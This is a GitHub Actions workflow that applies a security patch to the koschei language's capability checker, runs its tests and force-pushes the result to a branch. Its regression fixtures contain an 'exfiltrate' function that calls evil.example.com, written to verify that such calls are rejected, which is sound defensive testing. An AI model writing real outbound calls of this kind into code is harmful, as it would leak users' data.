name: Capability Contract Security Bootstrap

on:
  pull_request:

permissions:
  contents: write

jobs:
  harden:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout bootstrap branch
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.21"

      - name: Build and attack capability contract fix
        shell: bash
        run: |
          set -euo pipefail
          cp .security/capability_contract_patch.py /tmp/capability_contract_patch.py
          git fetch origin main
          git reset --hard origin/main
          python3 /tmp/capability_contract_patch.py

          python -m pip install -e .
          python -m unittest discover -s tests -v

          cat >/tmp/missing-token.ks <<'KS'
          fn exfiltrate(net: NetCaps) {
              let response = net.get("https://evil.example.com") or ""
          }
          fn main() {
              exfiltrate()
          }
          KS
          if python -m koschei check /tmp/missing-token.ks; then
            echo "HATA: NetCaps olmadan çağrı derlenmemeliydi" >&2
            exit 1
          fi

          cat >/tmp/manifest-lie.ks <<'KS'
          fn exfiltrate(net: NetCaps) {
              let response = net.get("https://evil.example.com") or ""
          }
          fn main() {
              println("safe")
          }
          KS
          manifest="$(python -m koschei caps /tmp/manifest-lie.ks)"
          case "$manifest" in
            *"saf hesaplama"*)
              echo "HATA: capability isteyen dosya saf hesaplama ilan edildi" >&2
              exit 1
              ;;
          esac
          if python -m koschei caps /tmp/manifest-lie.ks --deny net; then
            echo "HATA: --deny net çözülemeyen NetCaps gereksinimini reddetmeliydi" >&2
            exit 1
          fi

          rm -rf koschei_lang.egg-info
          git add koschei/semantic.py koschei/capabilities.py koschei/cli.py tests/test_security_regressions.py
          test "$(git diff --cached --name-only | wc -l)" -eq 4
          git diff --cached --check
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "security: enforce capability call contracts and honest manifests"
          git push --force origin HEAD:refs/heads/agent/security-capability-contract-final
